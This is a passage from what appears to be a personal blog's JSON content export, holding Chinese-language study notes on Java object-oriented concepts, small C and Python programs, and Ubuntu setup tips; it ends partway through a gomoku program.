如果两个概念都使用interface方式来定义，那么就反映出两个问题：1、我们可能没有理解清楚问题领域，AlarmDoor在概念本质上到底是Door还是报警器？2、如果我们对于问题领域的理解没有问题，比如：我们通过对于问题领域的分析发现AlarmDoor在概念本质上和Door是一致的，那么我们在实现时就没有能够正确的揭示我们的设计意图，因为在这两个概念的定义上（均使用interface方式定义）反映不出上述含义。 如果我们对于问题领域的理解是：AlarmDoor在概念本质上是Door，同时它有具有报警的功能。我们该如何来设计、实现来明确的反映出我们的意思呢？前面已经说过，abstract class在Java语言中表示一种继承关系，而继承关系在本质上是&quot;is a&quot;关系。所以对于Door这个概念，我们应该使用abstarct class方式来定义。另外，AlarmDoor又具有报警功能，说明它又能够完成报警概念中定义的行为，所以报警概念可以通过interface方式定义。如下所示：*/ abstract class Door { abstract void open(); abstract void close()； } interface Alarm { void alarm(); } class AlarmDoor extends Door implements Alarm { void open() { … } void close() { … } void alarm() { … } } /*这种实现方式基本上能够明确的反映出我们对于问题领域的理解，正确的揭示我们的设计意图。其实abstract class表示的是&quot;is a&quot;关系，interface表示的是&quot;like a&quot;关系，大家在选择时可以作为一个依据，当然这是建立在对问题领域的理解上的，比如：如果我们认为AlarmDoor在概念本质上是报警器，同时又具有Door的功能，那么上述的定义方式就要反过来了。*/abstractclass和interface是Java语言中的两种定义抽象类的方式，它们之间有很大的相似性。但是对于它们的选择却又往往反映出对于问题领域中的概念本质的理解、对于设计意图的反映是否正确、合理，因为它们表现了概念间的不同的关系（虽然都能够实现需求的功能）。这其实也是语言的一种的惯用法，希望读者朋友能够细细体会。","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"}]},{"title":"java抽象类","slug":"java抽象类","date":"2016-11-23T09:06:57.000Z","updated":"2020-11-14T17:11:59.853Z","comments":true,"path":"2016/11/23/java抽象类/","link":"","permalink":"http://yoursite.com/2016/11/23/java%E6%8A%BD%E8%B1%A1%E7%B1%BB/","excerpt":"","text":"学习自职坐标,以下代码大部分属于1.代码解释 package Abstract; public class EmployeeDemo { public static void main(String[] args) { JavaTeacher teacher = new JavaTeacher(10, &quot;张三&quot;, 10000); teacher.work(); teacher.aa(); Leader leader = new Leader(11,&quot;boss&quot;,10000,10000); leader.work(); //Employee emp = new Employee(10,&quot;hello&quot;,1000); //Cannot instantiate the type Employee无法实例化的类型的员工 /* * 一下内容通过多态 * */ System.out.println(&quot;----------------------------------&quot;); System.out.println(&quot;一下涉及多态&quot;); Employee employee1 = new JavaTeacher(10, &quot;张三&quot;, 10000); employee1.work(); Employee employee2 = new Leader(11,&quot;boss&quot;,10000,10000); employee2.work(); //leader1.more(); //The method more() is undefined for the type Employee if(employee2 instanceof Leader){ System.out.println(&quot;恭喜你,可以向下转型&quot;); Leader lead = (Leader)employee2; //可以实现lead特有的方法 lead.more(); //害的我赶紧看看我的津贴有没有丢失 lead.getAllowance(); } } } //抽象类(一旦一个类有抽象方法,那这个类就是抽象类) //但抽象类中也可能有具体的方法 abstract class Employee{ private int number; private String name; private double salary; public Employee(int number,String name,double salary){ this.number = number; this.name = name; this.salary = salary; } //抽象方法 public abstract void work();//注意抽象方法的写法,只是声明 public void aa(){ System.out.println(&quot; say hello&quot;); } } //一旦一个类去继承了抽象类,那么这个类就要么实现抽象类的抽象方法,要么继续抽象下去 class JavaTeacher extends Employee{ public JavaTeacher(int number, String name, double salary) { super(number, name, salary); } @Override public void work(){ System.out.println(&quot;上Java课&quot;); } } class Leader extends Employee{ private double allowance;//特有属性津贴 public Leader(int number, String name, double salary,double allowance) { super(number, name, salary); this.allowance = allowance; } public void getAllowance(){ System.out.println(allowance); } @Override public void work(){ System.out.println(&quot;培训新员工&quot;); System.out.println(&quot;设计课程体系&quot;); } public void more(){ System.out.println(&quot;监管&quot;); } } 1./*只要有抽象方法,就是抽象类,抽象类中也可以存在具体方法*/ //抽象类(一旦一个类有抽象方法,那这个类就是抽象类) //但抽象类中也可能有具体的方法 abstract class Employee{ private int number; private String name; private double salary; public Employee(int number,String name,double salary){ this.number = number; this.name = name; this.salary = salary; } //抽象方法 public abstract void work();//注意抽象方法的写法,只是声明 public void aa(){ System.out.println(&quot; say hello&quot;); } } 2.子类继承抽象类,必须实现抽象父类的抽象方法,@Override.除了以上,子类还可以有其特定的方法 抽象类和普通类的区别,抽象类的抽象方法，子类必须实现。比如父类有的方法在设计时，并不知道该怎么写，而要留给子类去实现，但又必须实现。这样的强制性是普通类所不具备的http://www.blogjava.net/wintys/archive/2009/06/15/pattern_template_method.html [以上内容来自](https://q.cnblogs.com/q/48158/)","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"}]},{"title":"java多态","slug":"java多态","date":"2016-11-21T03:03:23.000Z","updated":"2020-11-14T17:12:00.332Z","comments":true,"path":"2016/11/21/java多态/","link":"","permalink":"http://yoursite.com/2016/11/21/java%E5%A4%9A%E6%80%81/","excerpt":"","text":"多态性:多种行为 学习于职坐标,以下代码全部边看视频边敲,应该不算抄袭别人知识产权 package ploy; public class AnimalDemo { public static void main(String[] args) { //父类的引用变量可以引用其子类的对象 Animal animal1=new Dog(&quot;wangcai&quot;);//向上转型//上是指子类转成父类,可能会丢失方法 animal1.eat(); //animal1.hh()//这就是丢失方法,,无法调用hh() //向上转型首先是安全的,当可能会导致子类方法的丢失 //父类的引用变量,只能调用父类中有的方法或子类重写父类的方法 Animal animal2=new Cat(&quot;zhaocaimiao&quot;); animal2.eat(); /*多态存在的三个必要条件 * 1.需要存在继承和实现关系 * 2.同样的方法调用二执行不同操作,运行不同代码(重写操作) * 3.在运行时父类或者接口的引用变量可以引用其子类的对象 * */ //向下转型是不安全的 //1./*Cat cat = (Cat)animal1;*/// java.lang.ClassCastException//类型转换错误 /*instanceof * result = object instanceof class * 典型使用场合 * 在对对象做向下转型之前,没有其他有关对象类型信息时,务必使用instanceof 来判断一下,避免抛出ClassCastException * * */ //正确的做法 if(animal1 instanceof Cat){//并没有执行 System.out.println(&quot;hello1&quot;); Cat cat=(Cat)animal1; } if(animal2 instanceof Cat){ System.out.println(&quot;hello2&quot;); Cat cat=(Cat)animal2; cat.hh();//此时可以执行子类特有的方法 } //静态绑定:final,static,private和构造方法,在执行前已经绑定,这些方法是不可以修改的 //动态绑定:Person p=new Teacher();p.sayHi(); } } class Animal{ private String name; public Animal(String name){ this.name = name; } public void eat(){//这是一个通用的方法,通用方法实现没有太大的意义 } } class Dog extends Animal{ public Dog(String name){ super(name); } public void hh(){ System.out.println(&quot;nihai&quot;); } //对父类的方法的重写 @Override public void eat(){ System.out.println(&quot;啃骨头&quot;); } } class Cat extends Animal{ public Cat(String name){ super(name); } public void hh(){ System.out.println(&quot;nihai&quot;); } //对父类的方法的重写 @Override public void eat(){ System.out.println(&quot;吃鱼肉&quot;); } } 对上面的解释 1./*多态存在的三个必要条件 * 1.需要存在继承和实现关系 * 2.同样的方法调用二执行不同操作,运行不同代码(重写操作) * 3.在运行时父类或者接口的引用变量可以引用其子类的对象 * */ 2./*分为向上向下转型 (1)向上转型:Animal animal1=new Dog(&quot;wangcai&quot;);这样会丢失变量和方法,只能使用父类的已经存在的变量和被子类重写的方法. (2)向下转型:解决向上转型的确定,但是不安全的 /*Cat cat = (Cat)animal1;*/比如这句话,明明animal是dog型的,这样强转就会报错 instanceof * result = object instanceof class * 典型使用场合 * 在对对象做向下转型之前,没有其他有关对象类型信息时,务必使用instanceof 来判断一下,避免抛出ClassCastException * (3)向下转型时,可以具体实现子类中特有的方法(父类没有) //正确的做法 if(animal1 instanceof Cat){//并没有执行 System.out.println(&quot;hello1&quot;); Cat cat=(Cat)animal1; } if(animal2 instanceof Cat){ System.out.println(&quot;hello2&quot;); Cat cat=(Cat)animal2; cat.hh();//此时可以执行子类特有的方法 } x */具体实例 要求: 学校要安装打印机 打印机有很多种 public class PrinterDemo { public static void main(String[] args) { // ColorPrinter cp = new ColorPrinter(&quot;huipu&quot;); // School school = new School(); // school.setColorPrinter(cp); // Printer p=new ColorPrinter(&quot;huipu&quot;); School school = new School(); school.setPrinter(p); school.print(&quot;hello,java&quot;); } } //开闭原则:对修改是封闭的,对扩展是开放的 class School{/* private ColorPrinter cp=null; private BlackPrinter bp=null; //安装彩色打印机 public void setColorPrinter(ColorPrinter cp){ this.cp = cp; } //安装黑白打印机 public void setBlackPrinter(BlackPrinter bp){ this.bp=bp; } //print public void print(String content){ //交给中心打印机打印 cp.print(content); }*/ private Printer p=null; //拿父类的引用变量作为参数,好处就是可以接受任何其他子类的对象 //越是抽象的东西代表越稳定 public void setPrinter(Printer p){ this.p=p; } public void print(String content){ p.print(content); } } class Printer { private String brand; public String getBrand(){ return brand; } public Printer(String brand){ this.brand=brand; } //让子类去具体实现 public void print(String content){ } } class ColorPrinter extends Printer{ public ColorPrinter(String brand){ super(brand); } @Override public void print(String content){ System.out.println(getBrand()+&quot;彩色打印:&quot;+content); } } class BlackPrinter extends Printer{ public BlackPrinter(String brand){ super(brand); } @Override public void print(String content){ System.out.println(super.getBrand()+&quot;黑白打印:&quot;+content); } } class zhenPrinter extends Printer{ public zhenPrinter(String brand){ super(brand); } @Override public void print(String content){ System.out.println(super.getBrand()+&quot;针式打印:&quot;+content); } }","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"},{"name":"多态","slug":"多态","permalink":"http://yoursite.com/tags/%E5%A4%9A%E6%80%81/"}]},{"title":"java继承","slug":"java继承","date":"2016-11-17T10:41:41.000Z","updated":"2020-11-14T17:12:00.940Z","comments":true,"path":"2016/11/17/java继承/","link":"","permalink":"http://yoursite.com/2016/11/17/java%E7%BB%A7%E6%89%BF/","excerpt":"","text":"最近重新复习了继承,比第一次有更深的了解,温故而知新.1.继承基本,super,Override public class TeacherDemo { public static void main(String[] args) { JavaTeacher jteacher=new JavaTeacher(&quot;zhangsan&quot;, &quot;jiaoda&quot;); DBTeacher dteacher=new DBTeacher(&quot;nihao&quot;, &quot;phk&quot;); jteacher.teaching(); dteacher.teaching(); } } class Teacher{ private String name; private String school; public Teacher(String name,String school){ this.name=name; this.school=school; } public void teaching(){ System.out.println(&quot;授课钱准备&quot;); } } class JavaTeacher extends Teacher{ public JavaTeacher(String name,String school){ super(name, school); } @Override public void teaching(){//此时无法调用父类,可以super super.teaching(); System.out.println(&quot;eclipse&quot;); } } class DBTeacher extends Teacher{ public DBTeacher(String name,String school){ super(name, school); } @Override public void teaching(){ super.teaching(); System.out.println(&quot;sql&quot;); } } /*此处,Teacher是父类,JavaTeacher和DBTeacher都是继承Teacher, 1.父类的有参构造方法,JavaTeacher和DBTeacher他们的构造方法,super父类的构造方法. 2.父类中的方法,子类可以@Override,重写,只是为了覆盖父类的方法,当重写的时候,必须要保证返回值和形参都不能改变. 3.在@Override方法中,如果想调用父类的方法,可以,super.方法 */2.final关键字 public class FinalDemo { public static void main(String[] args) { A a=new A(); a.showNumber1(); final A a2=new A();/*此时,final的含义是a2是指向这个new A(),而不可以再下面再重新a2=new A()*/ /*a2=new A();The final local variable a2 cannot be assigned. It must be blank and not using a compound assignment*/ //final用在引用变量上,代表此引用变量,只能引用一开始说引用的的对象,中途不能改变 a2.number2 = 5; a2.showNumber2(); } } /*final */class A{ public final int number1 = 1; public int number2 = 2; public void showNumber1(){ System.out.println(number1); } public final void showNumber2(){//子类不能对父类中的final方法重写 System.out.println(number2); } } class B extends A{//当对class A 用final修饰时,无法继承 /*public void showNumber2(){ System.out.println(super.number2); }*/ } /* 1.对父类变量加final:public final int number1 = 1;则这个变量不可以修改 2.对方法加final:public final void showNumber2(){ System.out.println(number2); }//无法子类进行@Override 3.对对象加final: final class A{}则B无法继承A 4.final A a2=new A();/*first*///在main函数中加这个,则a2只能指向当前这个new A()而不能再写a2=new A();/*second*/ /*a2=new A();The final local variable a2 cannot be assigned. It must be blank and not using a compound assignment*/ //final用在引用变量上,代表此引用变量,只能引用一开始说引用的的对象,中途不能改变 */3.Object类 public class ObjectDemo { public static void main(String[] args) { Student stu=new Student(&quot;jack&quot;, 20); System.out.println(stu.toString()); Student stu2=new Student(&quot;jack&quot;, 20); System.out.println(stu.equals(stu2)); } } class Student{ private String name; private int age; public Student(String name, int age) { this.name = name; this.age = age; } @Override public String toString(){ return &quot;name: &quot;+name+&quot; age:&quot;+age; } @Override public int hashCode() { final int prime = 31; int result = 1; result = prime * result + age; result = prime * result + ((name == null) ? 0 : name.hashCode()); return result; } @Override public boolean equals(Object obj) { if (this == obj) return true; if (obj == null) return false; if (this.getClass() != obj.getClass())//返回类型,此处返回的是student return false; Student other = (Student) obj; if (this.age != other.age) return false; if (this.name == null) { if (other.name != null) return false; } else if (!this.name.equals(other.name)) return false; return true; } } /*每个类都默认继承Object 1.重写toString Object类的toString() public String toString() { return getClass().getName() + &quot;@&quot; + Integer.toHexString(hashCode()); }//getClass().getName()是返回类名 可以重写toString()方法 @Override public String toString(){ return &quot;name: &quot;+name+&quot; age:&quot;+age; } 2.重写equals方法 Object 中equals源码 public boolean equals(Object obj) { return (this == obj); } 重写equals方法 @Override public boolean equals(Object obj) { if (this == obj) return true; if (obj == null) return false; if (this.getClass() != obj.getClass())//返回类型,此处返回的是student return false; Student other = (Student) obj; if (this.age != other.age) return false; if (this.name == null) { if (other.name != null) return false; } else if (!this.name.equals(other.name)) return false; return true; } */学习自职坐标的java课程","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"},{"name":"继承","slug":"继承","permalink":"http://yoursite.com/tags/%E7%BB%A7%E6%89%BF/"}]},{"title":"位运算","slug":"位运算","date":"2016-11-16T02:16:18.000Z","updated":"2020-11-14T17:12:01.428Z","comments":true,"path":"2016/11/16/位运算/","link":"","permalink":"http://yoursite.com/2016/11/16/%E4%BD%8D%E8%BF%90%E7%AE%97/","excerpt":"","text":"int func(x) { int countx = 0; while (x) { countx ++; x = x &amp; (x - 1); } return countx; }假定x = 9999答案是8x&amp;(x-1) 求的是二进制中1的个数x|(x+1) 求的是二进制中0的个数 先把9999换成16进制，然后在转换成二进制，求二进制中1个个数。9999 = （270F） 16 = （0010 0111 0000 1111） 2总共8个1。 0010011100001111 &amp; 0010011100001110 = 00100111000011100010011100001110 &amp; 0010011100001101 = 00100111000011000010011100001100 &amp; 0010011100001011 = 00100111000010000010011100001000 &amp; 0010011100000111 = 00100111000000000010011100000000 &amp; 0010011011111111 = 00100110000000000010011000000000 &amp; 0010010111111111 = 00100100000000000010010000000000 &amp; 0010001111111111 = 00100000000000000010000000000000 &amp; 0001111111111111 = 0000000000000000 源地址","categories":[],"tags":[{"name":"面试题","slug":"面试题","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"}]},{"title":"Ubuntu 查看jdk-api文档","slug":"Ubuntu 查看jdk-api文档","date":"2016-11-07T03:10:34.000Z","updated":"2020-11-14T17:12:01.906Z","comments":true,"path":"2016/11/07/Ubuntu 查看jdk-api文档/","link":"","permalink":"http://yoursite.com/2016/11/07/Ubuntu%20%E6%9F%A5%E7%9C%8Bjdk-api%E6%96%87%E6%A1%A3/","excerpt":"","text":"安装软件 kchmviewer: sudo apt-get install kchmviewer下载chm文件:http://download.csdn.net/detail/yw1530/4841951 下载后点击文件,提取到桌面,并将该文件重命名为jdkapi.chm 然后右击打开方式.选择kchmviewer 来自俄罗斯的爱","categories":[],"tags":[]},{"title":"python Tkiinter 自制调色板","slug":"python Tkiinter 自制调色板","date":"2016-11-05T07:42:53.000Z","updated":"2020-11-14T17:12:02.454Z","comments":true,"path":"2016/11/05/python Tkiinter 自制调色板/","link":"","permalink":"http://yoursite.com/2016/11/05/python%20Tkiinter%20%E8%87%AA%E5%88%B6%E8%B0%83%E8%89%B2%E6%9D%BF/","excerpt":"","text":"import Tkinter as tk window=tk.Tk() def sliderUpdate(something): red=redSlider.get() green=greenSlider.get() blue=blueSlider.get() colour=&quot;#%02X%02X%02X&quot;%(red,green,blue) canvas.config(bg=colour) hexText.delete(0,tk.END) hexText.insert(0,colour) def buttonClick(): colour=hexText.get() canvas.config(bg=colour) redSlider.set(int(colour[1:3],16)) greenSlider.set(int(colour[3:5],16)) blueSlider.set(int(colour[5:7],16)) canvas=tk.Canvas(window) redSlider=tk.Scale(window,from_=0,to=255,command=sliderUpdate) greenSlider=tk.Scale(window,from_=0,to=255,command=sliderUpdate) blueSlider=tk.Scale(window,from_=0,to=255,command=sliderUpdate) hexText=tk.Entry(window,text=&quot;#000000&quot;) button=tk.Button(window,text=&quot;Click&quot;,command=buttonClick) redSlider.grid(row=1,column=1) greenSlider.grid(row=1,column=2) blueSlider.grid(row=1,column=3) canvas.grid(row=2,column=1,columnspan=3) hexText.grid(row=3,column=1,columnspan=3) button.grid(row=4,column=1,columnspan=3) window.mainloop()本段程序中重要运用到如下 1.Scale.get() 然后colour=”#%02X%02X%02X”%(red,green,blue)将数值写为字符串 2.redSlider.set(int(colour[1:3],16))这句话,是将一个16进制字符串,转化为10进制的数字,然后通过Scale.set() 方法 3.redSlider.grid(row=1,column=1) grid方法,来有点像html中table的布局,以及columnspan跨列 //刚在书上看到一个制作颜色选择器,然后自己又改了一点,自己做东西,有种丰衣足食的感觉","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"Linux(Ubuntu) 安装Python 2.7 IDLE","slug":"Linux(Ubuntu) 安装Python 2.7 IDLE","date":"2016-11-05T01:03:52.000Z","updated":"2020-11-14T17:12:02.956Z","comments":true,"path":"2016/11/05/Linux(Ubuntu) 安装Python 2.7 IDLE/","link":"","permalink":"http://yoursite.com/2016/11/05/Linux(Ubuntu)%20%E5%AE%89%E8%A3%85Python%202.7%20IDLE/","excerpt":"","text":"sudo apt-get update &amp;&amp; sudo apt-get upgrade输入密码 sudo apt-get install idle-python2.7来自一个晴天的星期六早晨 //转载自《零基础学Python(图文版)》","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"ubuntu","slug":"ubuntu","permalink":"http://yoursite.com/tags/ubuntu/"}]},{"title":"B树创建学生管理系统","slug":"B树创建学生管理系统","date":"2016-10-20T08:45:50.000Z","updated":"2020-11-14T17:12:05.318Z","comments":true,"path":"2016/10/20/B树创建学生管理系统/","link":"","permalink":"http://yoursite.com/2016/10/20/B%E6%A0%91%E5%88%9B%E5%BB%BA%E5%AD%A6%E7%94%9F%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/","excerpt":"","text":"功能如下1. 添加学生2. 删除学生3. 修改学生信息4. 获得学生信息5. 获得所有学生信息 B树创建优势 查找非常快2.任何一个学生只需要查询几步（譬如2的32次方的学生，每次只需要32次遍历）B树缺点1.严重浪费空间，有点符合动态规划的： 以空间换时间 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; typedef struct stu{ char name[20]; }stu; typedef struct Node{ struct Node *pre,*L,*R; int id; struct stu *info; }biTree; biTree* init(){ biTree *root=(biTree*)malloc(sizeof(biTree)); root-&gt;pre=NULL; root-&gt;L=NULL; root-&gt;R=NULL; return root; } void binary(int x,int b[]){ int i,j=0,temp,count=0; memset(b,0,32*sizeof(int)); if(x==0){ b[0]=0; } while(x!=0){ b[count]=x%2; x/=2; count++; } i=31; while(j&lt;=i){ temp=b[i];b[i]=b[j];b[j]=temp; i--;j++; } } void creat(biTree *root,int id){ biTree *bt,*pre; int b[32]; bt=root; binary(id,b); for (int i = 0; i &lt; 32; ++i){ if(b[i]==0){ if(bt-&gt;L!=NULL){ bt=bt-&gt;L; }else{ pre=bt; bt=(biTree*)malloc(sizeof(biTree)); pre-&gt;L=bt; bt-&gt;pre=pre; bt-&gt;L=NULL; bt-&gt;R=NULL; } }else if(b[i]==1){ if(bt-&gt;R!=NULL){ bt=bt-&gt;R; }else{ pre=bt; bt=(biTree*)malloc(sizeof(biTree)); pre-&gt;R=bt; bt-&gt;pre=pre; bt-&gt;L=NULL; bt-&gt;R=NULL; } } } bt-&gt;id=id; bt-&gt;info=(stu*)malloc(sizeof(stu)); printf(&quot;\\n\\t\\t\\tplease input the name:&quot;); scanf(&quot;%s&quot;,bt-&gt;info-&gt;name); } biTree* getnode(biTree *root,int id){ int b[32]; biTree *bt=root; binary(id,b); if(bt==NULL){ return NULL; } for (int i = 0; i &lt; 32; ++i){ if(bt==NULL){ return NULL; } if(b[i]==0){ bt=bt-&gt;L; if(bt==NULL){ return NULL; } }else if(b[i]==1){ bt=bt-&gt;R; if(bt==NULL){ return NULL; } } } return bt; } int main(){ biTree *root; biTree *stu,*pre; int code,studentId,i,b[32]; int a[1000]; char name[20]; memset(a,0,sizeof(a)); root=init(); while(1){ printf(&quot;\\n\\t\\t\\t==============student system===============&quot;); printf(&quot;\\n\\t\\t\\t 1.add student&quot;); printf(&quot;\\n\\t\\t\\t 2.del student&quot;); printf(&quot;\\n\\t\\t\\t 3.modify student&quot;); printf(&quot;\\n\\t\\t\\t 4.get student information&quot;); printf(&quot;\\n\\t\\t\\t 5.get all student information&quot;); printf(&quot;\\n\\t\\t\\tplease input the choice:&quot;); scanf(&quot;%d&quot;,&amp;code); switch(code){ case 1: printf(&quot;\\n\\t\\t\\tplease input studentId you want to add:&quot;); scanf(&quot;%d&quot;,&amp;studentId); if(a[studentId]==0){ a[studentId]=1; creat(root,studentId); printf(&quot;\\n\\t\\t\\tadd success&quot;); break; } else if(a[studentId]==1){ printf(&quot;\\n\\t\\t\\tthe student is already exit!&quot;); break; } break; case 2: printf(&quot;\\n\\t\\t\\tplease input the studentId you want del:&quot;); scanf(&quot;%d&quot;,&amp;studentId); binary(studentId,b); stu=getnode(root,studentId); if(stu==NULL){ printf(&quot;\\n\\t\\t\\tthe student don&apos;t exit&quot;); break; } pre=stu-&gt;pre; if(b[31]==0){ pre-&gt;L=NULL; }else{ pre-&gt;R=NULL; } free(stu); a[studentId]=0; printf(&quot;\\n\\t\\t\\tdel success&quot;); break; case 3: printf(&quot;\\n\\t\\t\\tplease input the studentId you want modify:&quot;); scanf(&quot;%d&quot;,&amp;studentId); stu=getnode(root,studentId); if(stu==NULL){ printf(&quot;\\n\\t\\t\\tthe student don&apos;t exit&quot;); break; } printf(&quot;\\n\\t\\t\\tid: %d,name: %s&quot;,stu-&gt;id,stu-&gt;info-&gt;name); printf(&quot;\\n\\t\\t\\tplease input the new name:&quot;); scanf(&quot;%s&quot;,stu-&gt;info-&gt;name); printf(&quot;\\n\\t\\t\\tmodify success!&quot;); break; case 4: printf(&quot;\\n\\t\\t\\tplease input the studentId you want search:&quot;); scanf(&quot;%d&quot;,&amp;studentId); stu=getnode(root,studentId); if(stu==NULL){ printf(&quot;\\n\\t\\t\\tthe student don&apos;t exit!&quot;); break; } printf(&quot;\\n\\t\\t\\tid: %d,name: %s&quot;,stu-&gt;id,stu-&gt;info-&gt;name); break; case 5: for(int i=0;i&lt;1000;i++){ if(a[i]!=0){ stu=getnode(root,i); printf(&quot;\\n\\t\\t\\tid: %d ,name: %s&quot;,stu-&gt;id,stu-&gt;info-&gt;name); } } break; } } return 0; }","categories":[],"tags":[{"name":"实训","slug":"实训","permalink":"http://yoursite.com/tags/%E5%AE%9E%E8%AE%AD/"},{"name":"学生管理系统","slug":"学生管理系统","permalink":"http://yoursite.com/tags/%E5%AD%A6%E7%94%9F%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"},{"name":"B树","slug":"B树","permalink":"http://yoursite.com/tags/B%E6%A0%91/"}]},{"title":"炮弹拦截","slug":"炮弹拦截","date":"2016-10-12T10:28:36.000Z","updated":"2020-11-14T17:12:05.918Z","comments":true,"path":"2016/10/12/炮弹拦截/","link":"","permalink":"http://yoursite.com/2016/10/12/%E7%82%AE%E5%BC%B9%E6%8B%A6%E6%88%AA/","excerpt":"","text":"#include &lt;stdio.h&gt; int main() { int N,m; int i,j,preMax,maxNum; int fire[20]; int test[20]; scanf(&quot;%d&quot;,&amp;N); while(N--){ scanf(&quot;%d&quot;,&amp;m); for(i=0;i&lt;m;i++){ scanf(&quot;%d&quot;,&amp;fire[i]); test[i]=1; preMax=0; for(j=0;j&lt;i;j++){ if(fire[j]&gt;fire[i]) preMax=(preMax&gt;test[j]?preMax:test[j]); } test[i]=preMax+test[i]; } maxNum=1; for(i=0;i&lt;m;i++) if(maxNum&lt;test[i]) maxNum=test[i]; printf(&quot;%d\\n&quot;,maxNum); } return 0; } 简单的动态规划","categories":[],"tags":[]},{"title":"贪吃蛇大作战","slug":"贪吃蛇大作战","date":"2016-09-27T12:19:15.000Z","updated":"2020-11-14T17:12:06.370Z","comments":true,"path":"2016/09/27/贪吃蛇大作战/","link":"","permalink":"http://yoursite.com/2016/09/27/%E8%B4%AA%E5%90%83%E8%9B%87%E5%A4%A7%E4%BD%9C%E6%88%98/","excerpt":"","text":"写了大概有一个星期的贪吃蛇，最后崩盘了，没有写成功也许是个错误的构思，用的二维int数组做的，写到最后一步的时候，已经实现的功能是在蛇屏幕上移动，还有判断game over ，还有随机产生果实 在写贪吃蛇的过程中，学到了不少， kbhit（）判断是否有键入，没有返回0，else return 非0； #include #include&lt;stdio.h&gt; #include&lt;conio.h&gt; #include&lt;stdlib.h&gt; int main(void) { char ch; while(ch!=27) { printf(&quot;HelloWorld\\n&quot;); if(kbhit()) ch=getch(); } printf(&quot;End!\\n&quot;); system(&quot;pause&quot;); return 0; } getch()和getchar（)是有区别的getchar();需要enter键，getch();并不需要 随机 #include &lt;time.h&gt; time_t t; srand((unsigned)time(&amp;t)); int randomNum=rand()%k+1; 贪吃蛇地图 #include &lt;stdio.h&gt; #include &lt;conio.h&gt; #include &lt;windows.h&gt; int main(){ int width = 30, height = width; //宽度和高度 int x, y; //x、y分别表示当前行和列 HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE); //设置窗口大小 system(&quot;mode con: cols=64 lines=32&quot;); //打印背景，按行输出 for(x=0; x&lt;width; x++){ for(y=0; y&lt;height; y++){ if(y==0 || y==width-1 || x==0 || x==height-1){ //输出边框 SetConsoleTextAttribute(hConsole, 4 ); printf(&quot;□&quot;); }else{ //贪吃蛇活动区域 SetConsoleTextAttribute(hConsole, 2 ); printf(&quot;■&quot;); } } printf(&quot;\\n&quot;); } //暂停 getch(); return 0; }//http://c.biancheng.net/cpp/html/2942.html下次再开车","categories":[],"tags":[{"name":"游戏","slug":"游戏","permalink":"http://yoursite.com/tags/%E6%B8%B8%E6%88%8F/"}]},{"title":"投入linux怀抱，拜拜win","slug":"投入linux怀抱，拜拜win","date":"2016-09-15T07:49:13.000Z","updated":"2020-11-14T17:12:06.851Z","comments":true,"path":"2016/09/15/投入linux怀抱，拜拜win/","link":"","permalink":"http://yoursite.com/2016/09/15/%E6%8A%95%E5%85%A5linux%E6%80%80%E6%8A%B1%EF%BC%8C%E6%8B%9C%E6%8B%9Cwin/","excerpt":"","text":"昨天下午装了ubuntu16.04，特别好玩，图像界面很赞哦， 现在身边3人在用linux的， 最大的感觉就是，eclipse运行好快，哈哈 下了Sublime Text3，最爱的文本编辑器，monokai的配色最爱 还有网易云音乐，有linux版本的 搜狗for linux 以前习惯用chrome浏览器，现在只能用他的chromium浏览器，还不错几乎一样 firefox也不错 最好玩的就是用，qq2012国际版的，感觉回到了几十年前","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"五子棋","slug":"五子棋","date":"2016-09-13T11:45:23.000Z","updated":"2020-11-14T17:12:07.856Z","comments":true,"path":"2016/09/13/五子棋/","link":"","permalink":"http://yoursite.com/2016/09/13/%E4%BA%94%E5%AD%90%E6%A3%8B/","excerpt":"","text":"耗时4小时写成 之前，对于这个五子棋这种，在我看来是一种比较简单游戏，但是，如何显示，我见过的五子棋，就是qq游戏里面的五子棋 后来，看到书上四子连题目写了， ** 这句话，当放下一颗子时，程序在控制台重新显示该棋盘，起初以为system(“cls”);之后打印棋盘，会造成屏幕上存在视觉停留，其实并没有 ** #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; #define MAX 10 int a[MAX][MAX]; int isOut(int i,int j)//是否越界 { if(i&lt;0||i&gt;9||j&lt;0||j&gt;9) return 0;//out return 1;//in } void print()//应用于打印棋盘 { int i,j; printf(&quot;p1玩家%c\\n&quot;,1); printf(&quot;p2玩家%c\\n&quot;,2); printf(&quot; &quot;); for(i=0;i&lt;10;i++) printf(&quot;%d &quot;,i); printf(&quot;\\n&quot;); for(i=0;i&lt;10;i++) { printf(&quot;%d &quot;,i); for(j=0;j&lt;10;j++) if(a[i][j]==0) printf(&quot;. &quot;); else if(a[i][j]==1) printf(&quot;%c &quot;,1); else printf(&quot;%c &quot;,2); printf(&quot;\\n&quot;); } } void testRight(int i,int j,int flag) { int m,n,sum,row,col; for(m=i-4,n=j-4;m&lt;=i,n&lt;=j;m++,n++) { sum=0; if(isOut(m,n)==0) continue; for(row=m,col=n;sum&lt;=5;row++,col++) if(a[row][col]!=flag) break; else sum++; if(sum==5) { printf(&quot;%cp%d success\\n&quot;,flag,flag); exit(1); } } } void testUpToDown(int i,int j,int flag) { int m,sum,row; for(m=i-4;m&lt;=i;m++) { sum=0; if(isOut(m,j)==0) continue; for(row=m;sum&lt;=5;row++) 